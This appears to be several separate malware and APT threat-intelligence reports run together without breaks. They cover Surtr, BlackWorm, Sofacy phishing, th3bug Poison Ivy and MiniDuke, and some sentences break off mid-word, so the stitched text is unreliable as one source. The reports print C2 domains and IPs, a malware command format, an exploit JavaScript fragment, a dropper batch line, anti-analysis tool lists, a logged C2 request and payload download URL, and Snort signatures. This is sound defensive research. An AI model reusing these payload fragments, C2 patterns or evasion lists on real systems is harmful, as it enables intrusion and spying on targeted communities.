In May 2012 , internet.3-a.net resolved to the same IP ( 184.82.123.143 ) as android.uyghur.dnsd.me , which is a C2 used in Android malware attacks that targeted the Tibetan community as previously documented by the Citizen Lab .
The stage two component that was downloaded in this particular case has an internal name of x86_GmRemote.dll , however we have seen an alternate stage two used with the name Remote.dll as well .
Our analysis in this post focuses on the GmRemote variation as it has been seen in multiple attacks .
Surtr 's capabilities include listing of file directories and contents on the victim computer and any USB drives connected to a victim machine , viewing web cache , executing remote commands and logging keystrokes .
In order to store temporary information , Surtr creates the following folders : % ALL USERS % /Application Data / Microsoft / Windows / MpCache % ALL USERS % /Application Data / Microsoft / Windows / nView_DiskLoydb % ALL USERS % /Application Data / Microsoft / Windows / nView_KeyLoydb % ALL USERS % /Application Data / Microsoft / Windows / nView_skins % ALL USERS % /Application Data / Microsoft / Windows / UsbLoydb For example , in nView_DiskLoydb , a file called FileList.db that contains file and directory listings will be placed and nView_KeyLoydb will contain text files with keylogger output .
The keylogger output is disguised by adding a constant to the ordinal value of the character .
This data can then be sent to the C2 .
It is compressed using zlib DEFLATE so the network traffic is not human readable without decompression .
It can also download additional malware onto the victim computer , which can provide attackers with further abilities like accessing the victim computer 's webcam or microphone .
In particular , we have seen Surtr used in conjunction with the Gh0st RAT derived LURK0 malware .
For persistency , Surtr adds a key to the registry to ensure it runs when the infected computer is restarted .
It also stores its C2 information and a campaign code in the registry .
Depending on the configuration , Surtr will either create multiple registry keys in Software\Microsoft\Windows Media in HKU ( hkey users ) with text data or a single key called XC consisting of binary data .
These are usually xor encrypted with a key of 0×1 .
Figure 2 : Encrypted data in XC key Figure 3 : Decrypted data ( note : e0 25 is 0x25e0 which is 9696 in hex ) We have seen a large number of similar samples sent to Tibetan groups that use the same stage two ( GmRemote ) and communicate with the following C2s : dtl.dnsd.me , dtl.eatuo.com , dtl6.mooo.com and tbwm.wlyf.org .
These C2s were also used in previous attacks documented in an earlier Citizen Lab post on LURK0 malware targeting the Tibetan community .
One particular sample ( md5 : ad9e5f79585eb62bc40b737e98bfd62e ) which connects to C2 domain dtl6.mooo.com ( which resolved to the same IP as the other dtl domains mentioned above ) on port 6178 was seen to download LURK0 malware after the initial Surtr infection .
This LURK0 sample had the campaign code ZQ6 that connects to C2 domain tbwm.wlyf.org on port 3103 .
This domain also resolved to the same IP as the dtl domains .
We have also found reports of other Surtr stage 2 ( GmRemote ) samples that have campaign codes which suggest they may be targeted at commercial and government targets .
The first sample was found via ThreatExpert .
It uses campaign code kmlg-0308 , and connects to a C2 at flyoutside.com .
This domain and eight others are registered to toucan6712 @ 163.com : Searching for more samples in Virus Total Intelligence ( VTI ) using domains and other identifying features reveals four related files : 7fbdd7cb8b46291e944fcecd5f97d135 – connects to C2 domain www.flyoutside.com , campaign code kmlg-0409 tb 58ff38412ebbedb611a3afe4b3dbd8b0 – connects to C2 IP 112.121.182.149 ( similar to above ) , campaign code lly-0311 81bc8974967e1c911b107a9a91e3178b – connects to C2 domain www.paulfrank166.2waky.com ( 192.198.85.102 ) , campaign code 0201- 2116 44758b9a7a6cafd1b8d1bd4c773a2577 – connects to C2 domain www.flyoutside.com ( same as the first sample found on ThreatExpert ) , campaign code lg-0109 Most of these samples have campaign codes that suggest commercial targets .
However , we do not have information about where these samples were submitted from , so the target sector and victims can not be confirmed .
A second GmRemote sample was found via the web , called Trojan / Subxe.89E1 by Anchiva .
This sample connects to google.djkcc.com and uses campaign code in1102 .
Other subdomains under djkcc.com include : airforce.djkcc.com domain.djkcc.com google.djkcc.com indianembassy.djkcc.com mailnic.djkcc.com ( MailNIC is an Indian email site at the National Informatics Centre ) microsoft.djkcc.com rediffmail.djkcc.com ( Rediffmail is an Indian email site ) While we do not have information about what victims these samples target , the campaign code , C2 domain , and related subdomains give some possible indications .
One additional find via VTI is a GmRemote sample internally named : GmKeyBoradServer_DLL.dll ( MD5 e7e1c69496ad7cf093945d3380a2c6f4 ) .
It exports functions ( GmFunctionType , GmInitPoint , GmMyInitPoint , GmRecvPoint , GmShutPoint , GmVerSion ) that are referenced in other GmRemote samples , although none of them have any real content .
These additional samples suggest that Surtr is being used to target groups beyond the Tibetan community and is possibly being utilized by multiple threat actors .
The attacks we have observed that use the Surtr malware family are another example of the persistent targeted malware campaigns the Tibetan community faces .
The specific attack reported in this post demonstrates that attackers are actively monitor mailing lists and discussion groups used by the Tibetan community and repurpose the content for use in targeted malware attacks .
For communities under persistent threat from targeted malware campaigns , user vigilance and education are essential for reducing risk .
Users should carefully examine the sender 's email address of emails and exercise caution in opening unexpected or unsolicited attachments or opening unverified links .
See Citizen Lab 's Recommendations for defending against targeted cyber threats for additional information , and Tibet Action Institute 's Detach from Attachments and Think Before You Click campaigns .
The Citizen Lab is continuing to monitor targeted malware campaigns using Surtr and will post updates as they are available .
Notable Strings : cScCssvdcfhgshtj CrtRunTime.log aCvVpR _ One.dll _ Fra.dll asasdasrqwfsdvctyqwm efskdfjaslkfjlaksd dksfjasdklfjasd casfjaklsdjfaskdlf bakjfasdkljfkldfjaslkd adskjfksldjfklsad soul LiveUpdata_Mem\ Burn\ Stage 2 ( downloaded component ) MD5 : 21aa9dd44738d5bf9d8a8ecf53c3108c Notable Strings : x86_GmRemote.dll Mark D : \Project\GTProject\Public\List\ListManager.cpp Footnote Post a Comment Your email is never shared .
The Syrian Electronic Army has made news for its recent attacks on major communications websites , Forbes , and an alleged attack on CENTCOM .
While these attacks garnered public attention , the activities of another group – The Syrian Malware Team – have gone largely unnoticed .
The group 's activities prompted us to take a closer look .
We discovered this group using a .NET
The Syrian Malware Team is largely pro - Syrian government , as seen in one of their banners featuring Syrian President Bashar al - Assad .
Based on the sentiments publicly expressed by this group it is likely that they are either directly or indirectly involved with the Syrian government .
Further certain members of the Syrian Malware Team have ties to the Syrian Electronic army ( SEA ) known to be linked to the Syrian government .
This indicates that the Syrian Malware Team may also be possibly an offshoot or part of the SEA .
Banner used by the Syrian Malware Team We found at least two distinct versions of the BlackWorm tool , including an original / private version ( v0.3.0 ) and the Dark Edition ( v2.1 ) .
The original BlackWorm builder was co - authored by Naser Al Mutairi from Kuwait , better known by his online moniker ' njq8′ .
He is also known to have coded njw0rm , njRAT / LV , and earlier versions of H - worm / Houdini .
We found his code being used in a slew of other RATs such as Fallaga and Spygate .
About section within the original version of BlackWorm builder Within the underground development forums , it 's common for threat actors to collaborate on toolsets .
Some write the base tools that other attackers can use ; others modify and enhance existing tools .
The BlackWorm builder v2.1 is a prime example of actors modifying and enhancing current RATs .
After njq8 and Black Mafia created the original builder , another author , Black . Hacker , enhanced its feature set .
About section within BlackWorm Dark Edition builder Black . Hacker 's banner on social media As an interesting side note , ' njq8′ took down his blog in recent months and announced a cease in all malware development activity on his Twitter and Facebook account , urging others to stop as well .
This is likely a direct result of the lawsuit filed against him by Microsoft .
The builder for BlackWorm v0.3.0 is fairly simple and allows for very quick payload , but does n't allow any configuration other than the IP address for command and control ( C2 ) .
Building binary through BlackWorm v0.3.0 BlackWorm v0.3.0 controller BlackWorm v0.3.0 supports the following commands between the controller and the implant : In addition to the features supported by the command structure , the payload can : Seek and kill no - ip processes DUC30 and DUC20 Disable Task Manager to kill process dialog Copy itself to USB drives and create autorun entries Copy itself to common peer - to - peer ( P2P ) share locations Collect system information such as OS , username , hostname , presence of camera , active window name , etc . , to display in the controller Kill the following analysis processes ( if found ) : procexp SbieCtrl SpyTheSpy SpeedGear Wireshark MBAM ApateDNS IPBlocker cPorts ProcessHacker AntiLogger The Syrian Malware Team primarily uses another version of BlackWorm called the Dark Edition ( v2.1 ) .
Unlike its predecessor , it also allows for granular control of the features available within the RAT .
These additional controls allow the RAT user to enable and disable features as needed .
Binary output can be also be generated in multiple formats , such as .exe
Based on Facebook posts , they are allegedly directly or indirectly involved with the Syrian government .
Their Facebook page shows they are still very active , with a post as recent as July 16th , 2014 .
Syrian Malware Team 's Facebook page The Syrian Malware Team has been involved in everything from profiling targets to orchestrating attacks themselves .
There are seemingly multiple members , including : Partial list of self - proclaimed Syrian Malware Team members Some of these people have posted malware - related items on Facebook .
Facebook posting of virus scanning of files While looking for Dark Edition samples , we discovered a binary named svchost.exe ( MD5 : 015c51e11e314ff99b1487d92a1ba09b ) .
We quickly saw indicators that it was created by BlackWorm Dark Edition .
Configuration options within code The malware communicated out to 178.44.115.196 , over port 5050 , with a command structure of : ! 0/j|n\12121212_64F3BF1F / j|n\ { Hostname } /j|n\ { Username } /j|n\USA / j|n\Win 7 Professional SP1 x86/j|n\No / j|n\2.4.0 [ Dark Edition ] /j|n\/j|n\ { ActiveWindowName } /j|n\ [ endof ] When looking at samples of Dark Edition BlackWorm being used by the Syrian Malware Team , the strings '' Syrian Malware , '' or `` Syrian Malware Team '' are often used in the C2 communications or within the binary strings .
Additional pivoting off of svchost.exe brought us to three additional samples apparently built with BlackWorm Dark Edition .
When executed , the binary beacons to aliallosh.sytes.net on port 1177 .
This C2 has been seen in multiple malware runs often associated with Syria .
The command structure of the binary is : ! 0/j|n\Syrian Malware / j|n\ { Hostname } /j|n\ { Username } /j|n\USA / j|n\Win 7 Professional SP1 x86/j|n\No / j|n \0.1/j|n\/j|n\ { ActiveWindowName } /j|n\ [ endof ] Finally , pivoting to another sample , 1gpj.srcRania ( MD5 : f99c15c62a5d981ffac5fdb611e13095 ) , the same strings were present .
The string `` Rania '' used as a lure was in Arabic and likely refers to the prolific Queen Rania of Jordan .
The traffic is nearly identical to the other samples we identified and tied to the Syrian Malware Team .
Connecting the dots between actors and malware typically involves looking at binary code , identifying related malware examples associated with those binaries , and reviewing infection vectors , among other things .
This blog presents a prime example of the process of attribution .
We connected a builder with malware samples and the actors / developers behind these attacks .
This type of attribution is key to creating actionable threat intelligence to help proactively protect organizations .
This entry was posted in Threat Intelligence , Threat Research and tagged advanced threat , syrian cyber threats , Syrian Electronic Army , Syrian Malware Team , threat group by Kyle Wilhoit and Thoufique Haq .
Bookmark the permalink .
Background Our analysts follow the activities of a number of threat groups with a wide range of motivations .
In this bulletin we are sharing intelligence relating to a recent phishing campaign conducted by a group widely referred to as ' Sofacy ' , named after the antivirus detection name for one of the malware families used by the group .
Over the years there have been a number of papers discussing variations to the malware used by the group , but little discussion of less sophisticated techniques employed by the same attackers .
Analysis Sofacy has been discussed before as being used to target APEC members and there has also been some prior analysis of the malware itself .
Variants of the malware have been in use for a considerable amount of time – for example , the screenshot below is from the decoy document loaded by one of the earliest versions present on ThreatExpert , from February 2010 .
Sample 5e3bea788e89e0814e898b4a648b93c0b74f7e2c Decoy documents are used in conjunction with malware droppers in order to make the target believe the file they have just opened is legitimate .
The documents often give an indication of the attackers ' intended targets .
More recently , ESET have reported5 on related spear phishes using NATO / Ukrainian conflict themes and watering hole attacks likely targeting the defence industry and a Polish finance company .
It has been publicly speculated before that Sofacy malware is Russian in origin .
Indicators found in the malware analysis referenced in the appendix , such as embedded resources and targeting would appear to support this theory .
Targeting Recently , we observed a number of new domain registrations by the Sofacy attackers , all of which are closely related via shared WHOIS data and infrastructure .
New domain registrations are usually indicative of a new campaign , and so we were eager to find new samples of the malware which connected to the infrastructure .
The domain names chosen were almost identical to the legitimate domains of several organisations , a common technique and , like carefully chosen decoy documents , often gives clues as to the likely targets of the campaign .
The new domain names mimicked organisations in the following categories : • International and European diplomatic institutions • Popular providers of web services • Military institutions , contractors and conferences • Energy companies • News organisations based out of the United States and Central Europe In addition to new malware samples , we also found examples where the attackers were using the simple technique of phishing for credentials .
The usage of malware in targeted attacks to steal information of value to attackers has been widely reported , however the simple technique of phishing for credentials , whilst still relatively common in targeted attacks , is still more typically associated with criminal attackers involved in day to day cyber - fraud .
The pages used for phishing typically used obfuscated code to redirect the user to another webpage : In some pages the malicious redirect was disabled by the attackers , by placing additional JavaScript on the page which would redirect users to a legitimate site preferentially .
Fake login pages were observed both for webmail and two factor - authentication platforms .
In the second case this would require the attackers to log in at the same time as affected victims , showing a level of dedication to the cause .
As well as the domains used being similar to those of the targeted , the pages were also made to appear the same as their legitimate counterparts , making it difficult for end - users to tell they were being duped .
For example the screenshot below shows the contents of a credential phishing website designed to mimic the legitimate OWA site of a defence contractor .
The attacker 's version is on the left , the real version is on the right : Two of the domains we identified have previously been associated in open source with credential phishing , although not attributed to this group of attackers :  In October 2013 the domain chmail [ .
Recommended Actions As ever with phishing attacks , one of the most important preventative steps you can take is to educate staff on how to identify suspicious emails – especially as there are fewer technical measures that can be taken to prevent low distribution phishing attacks which aim to steal credentials than there are for similar attacks involving malware .
Organisations with good logging for their e - mail data could attempt to detect activity relating to compromised accounts by alerting on `` impossible journeys '' , where locations from which users log in are monitored and where alerts are produced when a single user logs in from two separate countries in a short period of time .
Snort Signatures We have developed some SNORT signatures to detect the current template used by the attackers in their phishing campaigns .
The following signatures detect Javascript that is present on many obfuscated redirects , not necessarily related to this activity but which may be indicative of Sofacy phishing : alert tcp $ EXTERNAL_NET $ HTTP_PORTS - > $ HOME_NET any ( msg : '' Potential Sofacy Phishing Redirect '' ; flow : established , to_client ; content : '' \ '' \\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E\ '' '' ; classtype : trojan - activity ; reference : url , http : //pwc.blogs.com / cyber_security_updates/2014/10/phresh - phishing - against- government-defence-and-energy.html ; sid : xxxxxx ; rev:1 ; ) alert tcp $ EXTERNAL_NET $ HTTP_PORTS - > $ HOME_NET any ( msg : '' Potential Sofacy Phishing Redirect '' ; flow : established , to_client ; content : '' \ '' x6Cx6Fx63x61x74x69x6Fx6E\ '' '' ; classtype : trojan - activity ; reference : url , http : //pwc.blogs.com / cyber_security_updates/2014/10/phresh - phishing - against- government-defence-and-energy.html ; sid : xxxxxx ; rev:1 ; ) The following comment occurs in many of the pages we ' ve observed relating to this campaign , but can also appear in some legitimate sites : alert tcp $ EXTERNAL_NET $ HTTP_PORTS - > $ HOME_NET any ( msg : '' Potential Sofacy Phishing Redirect '' ; flow : established , to_client ; content : '' // stop for sometime if needed '' ; classtype : trojan - activity ; reference : url , http : //pwc.blogs.com / cyber_security_updates/2014/10/phresh - phishing - against- government-defence-and-energy.html ; sid : xxxxxx ; rev:1 ; ) For more information on this threat actor and further indicators of compromise , please get in touch with us at threatintelligence @ uk.pwc.com .
Appendix 1 - Domains Domains involved in this phishing campaign and associated domains used by the same threat actor : References http : //smallmedia.org.uk / sites / default / files / u8/IIIPSepOct.pdf https : //twitter.com / MalCrawler / status/489128440323252226 The information contained in this document has been prepared as a matter of interest and for information purposes only , and does not constitute professional advice .
You should not act upon the information contained in this email without obtaining specific professional advice .
No representation or warranty ( express or implied ) is given as to the accuracy or completeness of the information contained in this email , and , to the extent permitted by law , PricewaterhouseCoopers LLP , its members , employees and agents do not accept or assume any liability , responsibility or duty of care for any consequences of you or anyone else acting , or refraining to act , in reliance on the information contained in this email or for any decision based on it .
Using Poison Ivy We ' ve uncovered some new data and likely attribution regarding a series of APT watering hole attacks this past summer .
Watering hole attacks are an increasingly popular component of APT campaigns , as many people are more aware of spear phishing and are less likely to open documents or click on links in unsolicited emails .
Watering hole attacks offer a much better chance of success because they involve compromising legitimate websites and installing malware intended to compromise website visitors .
These are often popular websites frequented by people who work in specific industries or have political sympathies to which the actors want to gain access .
The attacks discussed in this blog are related to an APT campaign commonly referred to as `` th3bug '' , named for the password the actors often use with their Poison Ivy malware .
Of note , only the older of the samples we cover in this blog used that password .
We do n't know the reason the actors changed this , but it could possibly be in reaction to information widely published on the Internet about their activities , which use that password as a key component to tie the activity together .
In contrast to many other APT campaigns , which tend to rely heavily on spear phishing to gain victims , '' th3bug '' is known for compromising legitimate websites their intended visitors are likely to frequent .
Over the summer they compromised several sites , including a well - known Uyghur website written in that native language .
While we were unable to recover the initial vulnerability used , it is possibly the same CVE 2014 - 0515 Adobe Flash exploit first reported by Cisco TRAC in late July .
We can not confirm the initial compromised sites , but we noted traffic to several known re - direct sites and the malware was configured to use the same command and control ( C2 ) server .
In addition , the download dates of many of our files pre - date those noted by Cisco by only a few days .
All of the malware were variants of the Poison Ivy Remote Administration Tool ( RAT ) and were properly identified as such by our WildFire platform .
The targets of the attack were : Uyghur sympathizers An East Asian office for a major US based computer manufacturer A major US university An international wholesale and retail telecom provider We saw the first sample on July 14 , 2014 .
This sample had an interesting PDB string – C : \Users\sophie\documents\visual studio 2010\Projects\init\Release\init.pdb with a time date string that exactly matched the PE timestamp of 11 July , 2014 .
Table 1 The next day we collected several copies of the same malware intended for the same industry .
They were downloaded from one of the download URLs in the below table , but all had the same MD5 and C2 domain .
Table 2 On July 16 WildFire picked up a malicious executable hosted on uyghurweb.net , a legitimate Uyghur website that was compromised to infect users .
The file was named `` PYvBte.jar '' but was actually a Windows executable .
The file has the characteristics listed in Table 3 , and appears to be a stand - alone executable version of the Metasploit Meterpreter shell .
When this file runs , it downloads a payload from uyghurweb.net/player/gmuweb.exe and executes it .
This file is the same Poison Ivy RAT described in Table 2 .
The Meterpreter payload masquerades as a copy of the ApacheBench tool made by the Apache Software Foundation .
Table 3 On 21 July , we detected another sample that was noted in the Cisco TRAC blog .
The initial download URL and IP resolution were different than the previous samples , but the C2 domain and resolution matched .
This file is also a Poison Ivy variant .
Table 4 Based on historical IP resolution overlaps between the above C2 domains and other domains that have also resolved to the same IPs , we found an additional sample from the beginning of this year .
Interestingly , the first sample was not logged in VirusTotal prior to our submission , despite the sample having been in use in the wild for at least seven months .
In addition , it is the only sample tied to this activity we found that used the Poison Ivy password `` th3bug '' .
Also of note , the IP resolution for this C2 domain was changed to match the IP resolution of the C2 domains used in the July activity only a few days after these samples were seen .
Additionally , the files PE timestamp was January 21 , the day before we detected the sample .
Targeted industries for this series are listed below .
Another international wholesale and retail telecom provider A major visual computing company headquartered in the US A state - owned East Asian financial services company Table 5 Watering hole attacks will continue to be popular with APT campaigns , as they are much harder to defend against then spear phishing attacks .
There is no way for people browsing to these websites to know in advance the normally trusted website has been compromised and will serve them malware when they visit it .
Ensuring web browsers and operating system software is fully patched and up - to - date is the best way to defend against this type of threat .
However , to increase success rates APT campaigns can use zero - day exploits , so even a properly patched system would be compromised .
Palo Alto Networks users should use our firewall 's ability to block executable downloads unless the user specifically authorizes it .
If you want to allow executables through but prefer that they be analyzed for malicious activity , use our WildFire platform , which correctly identified all of the files listed in this blog as malware and provides users with a full report on the samples host and network - based activities .
Authors : Costin Raiu , Igor Soumenkov , Kurt Baumgartner , Vitaly Kamluk Global Research and Analysis Team , Kaspersky Lab On Feb 12th 2013 , FireEye announced the discovery ( http : //blog.fireeye.com / research/2013/02/the - number - of - the- beast.html ) of an Adobe Reader 0-day exploit which is used to drop a previously unknown , advanced piece of malware .
We called this new malware `` ItaDuke '' because it reminded us of Duqu and because of the ancient Italian comments in the shellcode copied from Dante Aligheri 's Divine Comedy .
Since the original announcement , we have observed several new incidents using the same exploit ( CVE-2013 - 0640 ) , some of which were so unusual that we decided to analyze them in depth .
Together with our partner CrySyS Lab , we ' ve performed a detailed analysis of these new incidents which indicate a new , previously unknown threat actor .
For their analysis , please read http : //blog.crysys.hu/2013/02/miniduke/ .
For our analysis , please read below .
First of all , while the fake `` Mandiant '' PDF reports ( see http : //blog.seculert.com/2013/02/spear - phishing - with - mandiant - apt- report.html ? utm_source = feedburner & utm_medium = feed & utm_campaign = Feed % 3A+SeculertResearchLab+ ( Seculert+Researc h+Lab ) ) are just dirty hacks of the original exploit , these newer attacks appear to have been created by a 0-day toolkit that was used to build the original `` Visaform Tukey.pdf '' discovered by FireEye .
The new PDF attacks drop fake documents that are shown to the victim if the exploit is successfully executed .
The documents refer to a human rights seminar ( ASEM ) and Ukraine 's foreign policy and NATO membership plans : Document used against the Hungarian target Document used against the Belgian target PAGE 3| The MiniDuke Mystery : PDF 0-day Government Spy Assembler 0x29A Micro Backdoor | Document used against the Luxemburg target The MD5s for the documents used in this attack are : 3668b018b4bb080d1875aee346e3650a action_plan.pdf ( Country : Belgium ) 88292d7181514fda5390292d73da28d4 ASEM_seminar.pdf ( Country : Hungary ) 3f301758aa3d5d123a9ddbad1890853b EUAG_report.pdf ( Country : Luxembourg ) 0cdf55626e56ffbf1b198beb4f6ed559 report.pdf ( Country : Spain ) cf5a5239ada9b43592757c0d7bf66169 EUAG_report.pdf ( Country : Belgium ) c03bcb0cde62b3f45b4d772ab635e2b0 The 2013 Armenian Economic Association.pdf ( Country : Belgium ) The JavaScript exploit code has been modified since the original attack .
For instance , the function named `` oTHERWISE '' was renamed to `` q1w2e3r4 t '' .
The function is later called in the code like this : New exploit : var sCIENZA = q1w2e3r4 t ( vOLENCI [ sHOGG ( ' ODNEDNERp',3329,7937 ) ] , gIRARSI ) ; Older ( `` Visaform Turkey.pdf '' ) exploit : var sCIENZA = oTHERWISE ( vOLENCI [ ' pRENDENDO ' ] , gIRARSI ) ; In addition , the JS code is now in compressed format , while the original sample had it in plaintext .
The reason behind the changes is probably to avoid detection by anti - malware products although this does n't prevent our product from detecting it heuristically as `` HEUR : Exploit . Script . Generic '' .
The shellcode contained in the PDF document is similar to that used in the documents carrying the `` Itaduke '' payload , with some differences .
For instance , after exploiting the vulnerability , it searches for a specific signature within the PDF file .
While the `` Itaduke '' shellcode was looking for `` ! H2bYm . Sw @ '' , the MiniDuke version uses a different signature , `` @ 34fZ7E*p\ '' .
Signature in the Itaduke PDF file Signature in the Miniduke PDF file Once the payload signature is found , it is decrypted with XOR and then decompressed using RtlDecompressBuffer API ( LZNT1 ) .
The resulting PE file is written to a temporary file and loaded using LoadLibary API .
The resulting dynamic library implements the second stage of installation .
It contains two binary resources , 101 and 102 .
Resource 101 is the main backdoor DLL component .
It is written to the % AppData % directory and loaded using LoadLibary API .
Resource 102 is the decoy PDF document .
It is written to the Internet cache directory and then opened using a simple BAT file : TASKKILL /F /IM acro * ping -n 1 127.0.0.1 > nul start `` '' `` % path to decoy PDF document % '' The filenames of the dropped files are hardcoded in their resources .
Beginning of the resource 101 with its filename Beginning of the resource 102 with its filename Interestingly , the malware dropper contains the following paths : ● `` c : \src\dlldropper\Release\L2P.pdb '' .
These paths did not exist in the dropper of original PDF ( `` Visaform Turkey.pdf '' ) .
If we are to trust the PE headers , the dropper was compiled on Feb 20 , 2013 : ' Hungarian ' dropper compilation time - `` Feb 20 10:51:16 2013 '' The backdoor used in the Hungarian case was compiled on `` Feb 20 10:57:52 2013 '' , just minutes after the dropper was created .
Perhaps the most unusual thing about these three new attacks is the malware they drop .
In all the analyzed cases , the dropped malware is in the form of a 22,528 bytes DLL file .
Parts of the malicious DLL file are encrypted with information related to the system configuration , which ensures it will only work properly on the victim 's system .
If copied to another computer , the malware will be unable to function successfully .
The backdoor is written in `` old school '' assembler and is tiny by current standards - only 20 KB .
This is most unusual for modern malware , which can be several megabytes in size .
It has a small decryptor at the beginning that decrypts the main body .
All three cases use different encryption keys .
Another peculiarity is that the backdoor has no imports : all functions are scanned from memory and are called dynamically .
It is also interesting that the first two Win32 APIs resolved and called by the unpacking stub are ntdll . LdrLoadDll and kernel32.VirtualProtectEx .
These two functions are not called according to the '' _ stdcall '' convention .
Instead , a ' jmp ebx ' instruction is executed after manually building the stack .
Clearly some thought went into creating anti - emulation and anti - scanning techniques with this malware .
The backdoor has a single export , which for instance is named `` JorNgoq '' in the Hungarian case .
When this export is called at load , the backdoor sets the `` .rdata
The entrypoint of the library ( DllMain ) is obfuscated and the main body of the malware is encrypted .
The encryption is rather simple : the `` .rdata
Both keys are derived from the length of the encrypted part .
Once finished decrypting , the library proceeds to the real `` main '' function .
The main part of the library is written in Assembler , in an `` old - school '' manner typical for low - level viruses .
The code is position independent ; it has no imports and resolves API function addresses by hash values of their names .
The backdoor maintains seven call addresses that each maintain their own block of functionality .
The first block calls GetAsyncKeyState twice , checking for a mouse click , which indicates user activity in the system .
The second block searches for all `` * .exe '' and `` * .dll '' files located in the % temp % directory .
The third block fetches information about the infected system with calls to gather information about the CPU , drive and the computername - these are used to decrypt the backdoor 's main body , which is custom encrypted for each unique victim .
The fourth block attempts to maintain self - protection from malware analysis .
Below is the list of tools ( and VMware ) that it attempts to identify and protect against .
It fetches the list of running processes on the system and attempts to identify if these tools are among them : apispy32.exe , apimonitor.exe , winapioverride32.exe , procmon.exe , filemon.exe , regmon.exe , winspy.exe , wireshark.exe , dumpcap.exe , tcpdump.exe , tcpview.exe , windump.exe , netsniffer.exe , iris.exe , comview.exe , ollydbg.exe , windbg.exe , odb.exe , ImmunityDebugger.exe , syser.exe , idag.exe , idag64.exe , petools.exe , vboxtray.exe , vboxservice.exe , procexp.exe , vmtools.exe , vmwaretray.exe , vmwareuser.exe If any of the tools above are detected on the system , the malware will continue running on the system without further decrypting its code and exhibiting any other functionality .
This will prevent it from doing any outbound communications with Twitter accounts , as described below .
In other words , it will attempt to appear non - functional , especially to automated analysis , hiding its true nature behind its layers of encryption .
User agent strings for web browsers like Opera , Mozilla and Internet Explorer are decrypted and used for all Internet access .
Oddly , there are Linux versions included as well : ( Windows NT 5.1 ; ( Windows NT 6.0 ; ( Windows ; U ; Windows NT 5.2 ; ( X11 ; Linux i686 ; ( X11 ; Linux x86_64 ; ( compatible ; MSIE 6.0 ; Windows NT 5.0 ; ( compatible ; MSIE 7.0 ; Windows NT 6.0 ; ( compatible ; MSIE 9.0 ; Windows NT 6.1 ; WOW64 ) ; Trident/4.0 ) ; Trident/5.0 ) ; WOW64 ; Trident/5.0 ) ; SV1 ) ) The fifth and sixth code blocks are most interesting .
They calculate the SHA1 of main system information which will be used in the C2 interaction later .
Following the SHA-1 hash generation , the backdoor will base64 encode its unique hash for later C2 communication .
The malware is activated upon reboot of the infected machine .
To gain control at boot , it writes a randomly named LNK file to the startup folder , which in turn calls the main body using rundll32 : In the picture above , the malware 's main body is stored as `` stat.bin '' ( a randomly selected name ) in the `` Adobe '' folder .
The LNK file calls it only exported function , `` ImqRgno '' .
Once activated , the malware will first contact Twitter and look for posts from some very specific accounts .
These accounts should have posted an encrypted string which contains the magic identifier `` uri ! `` , then an encrypted c2 string .
We presume many other Twitter accounts exist with similar parameters .
The encrypted `` uri ! '' holds a different c2 for each version of the malware : It 's most likely that these websites have been hacked by the attackers and injected with the command and control PHP script .
Secondly , the malware will connect to `` www.geoiptool.com '' to obtain information about the victim 's location .
Interestingly , the backdoor has another update / c2 functionality .
It searches Google for a very specific string : The pages found by the Google search may hold an update `` uri '' similar to the one from Twitter .
We can assume the attackers wanted to have a second channel for updates in case the Twitter accounts are closed .
Stage 2 The `` index.php '' on the C2 serves a fake GIF file to the victim , depending on the parameters it receives .
Here 's what one of these GIF files looks like : Here 's one example of a malicious request for the C2 domain `` arabooks*dot+ch '' : arabooks.ch/lib/index.php ? ia = TJ2b7uzMuh4fnt2n7aJisckAj6pEvkLPPsmk5gC77rPeYKmj8z58UWS1szY0FGzkp [ REMOVED ] lhUDx vzo1_IpYHfDI2MTg2NTM5OTF8MS4xMw== The picture from the GIF file is actually very small and reminds us of the method used by Duqu back in 2011 to hide data , known as ' steganography ' : At offset 0x6a4 inside the GIF file , there is a hidden encrypted PE file .
The encryption scheme used a DWORD key also stored in the GIF file that is rotated .
Effectively , this translates to an 8 byte long XOR key .
The resulting encryption key used in the Hungarian attack for instance is { 0xD2 , 0x2A , 0xA2 , 0x27 , 0x79 , 0x95 , 0x52 , 0x2D } .
In the Belgian attack , it is { 0xC5 , 0x5E , 0xEE , 0xE5 , 0x51 , 0x11 , 0x17 , 0x7C } .
For the Luxemburg attack , the key is { 0x91 , 0x18 , 0x8C , 0xC1 , 0x1C , 0xC9 , 0x9C , 0xC9 } .
The decrypted PE file ( plugin / payload ) is also written in assembler and , once again , it is encrypted with the same algorithm as the backdoor originally deployed in the system .
We refer to it as `` stage 2 '' .
The main backdoor body saves the plugin with different names , for instance , it can be `` xml.dat '' and tries to run its only export using rundll .
In our case , this did n't appear to work very well : Several different variants of the 2nd stage backdoors have been observed on the C2 ; they all perform similar functions but are encrypted with different keys and contact different C2s .
The malware connects to several C2s depending on the information available on the control Twitter accounts or on Google .
For instance , on `` artas*dot+org '' it connects to `` /engine / index.php '' .
Interestingly , the `` img '' subfolder allows listings and we can see several variants of the backdoor encrypted as GIF files : On `` tsoftonline*dot+com '' , the folder has the same structure : Interestingly , on `` tsoftonline*dot+com '' we have several other files with different kind of names and sizes .
They are larger and follow a different naming scheme : `` * number+.gif '' .
We believe they are custom backdoors delivered only to specific victims by the attackers .
We refer to these as `` stage 3 '' .
While we were analyzing the samples , the attackers connected to the C2 and added a custom backdoor as `` 1109821546.gif '' : `` http : //tsoftonline.com / views / img/1109821546.gif '' HTTP/1.1 200 OK Date : Mon , 25 Feb 2013 12:34:13 GMT Server : Apache Last - Modified : Mon , 25 Feb 2013 10:59:49 GMT ETag : `` 7c8251 - 5190d-4d68a708d9340 '' Accept - Ranges : bytes Content - Length : 334093 Content - Type : image / gif This custom backdoor , referred to as `` stage 3 '' , is much bigger than the previous ones – 300K+ in size .
This is because the attackers used large layers of obfuscation code , including UCL compression .
So far , we have observed two variants of the 300 K '' stage 3 '' backdoor .
The PE compilation timestamp for both is `` Mon Jun 18 17:28:11 2012 '' .
The number `` 1109821546 '' in the filename refers to the unique victim ID .
In this case , we were able to determine that the victim is based in Portugal .
The backdoor connects to the following C2 for instructions : news [ dot ] grouptumbler [ dot ] com / news / feed.php IP : 200.63.46.23 It supports several commands , such as copy file , move file , remove file , make directory , kill process and of course , download and execute new malware .
The server at 200.63.46.23 is hosted in Panama : We presume that it was hacked by the attackers and is currently used as a command server for the attacks .
The C2 is : 85.95.236.114 The module has a compilation timestamp of `` Tue Nov 13 14:30:12 2012 '' .
The C2s maintain a detailed , encoded log of the victims connecting to the servers .
The logs are available to anyone who knows the exact filename .
